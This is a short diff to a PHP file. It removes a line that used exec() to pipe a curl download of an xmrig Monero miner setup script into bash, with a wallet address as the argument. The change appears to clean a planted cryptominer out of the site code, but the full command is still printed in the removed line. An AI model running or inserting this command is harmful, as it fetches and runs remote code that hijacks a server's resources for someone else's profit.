@@ -1,4 +1,4 @@
-exec("curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 42hot38TivSey76r5aHfshH48XEJ5WHosiJF1WCeHy1vL9W86DvcX97JrQPLPCHPVt3FZ1XtvXEPGC6E87sgZW69MaJMuXW");
+
 function spiderip($ip) {
         $spiderip = [
 
